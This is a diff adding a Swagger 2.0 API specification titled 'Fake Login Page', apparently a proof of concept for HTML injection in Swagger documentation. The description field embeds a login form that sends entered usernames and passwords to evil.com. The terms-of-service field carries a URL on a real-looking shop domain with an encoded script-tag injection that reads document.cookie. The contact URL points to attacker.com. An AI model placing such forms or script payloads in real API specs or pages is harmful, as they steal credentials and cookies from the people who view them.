@@ -1,4 +1,35 @@
-
+swagger: '2.0'
+info:
+  version: 1.0.0
+  title: Fake Login Page
+  description: |
+    <div class="form-container">
+      <form action="https://evil.com" method="get" class="form-signin">
+        <div class="form-group">
+          <label for="username">Username</label>
+          <input type="text" name="username" size="20">
+        </div>
+        <div class="form-group">
+          <label for="password">Password</label>
+          <input type="password" name="password" size="20">
+        </div>
+        <div class="form-group">
+          <button type="submit" class="btn btn-default">Login</button>
+        </div>
+      </form>
+    </div>
+  termsOfService:  |
+            https://bonanzasatrangi.com/collections/unstitched/%3Cscript%20src=data:text/html,alert(document.cookie)%3E%3C/script%3E
+  contact: 
+    name: "API Support"
+    url: "https://attacker.com/"
+    email: "bilalabbasuk@gmail.com"
+paths:
+  /:
+    post:
+      responses:
+        '200':
+          description: Login successful
 
 
 
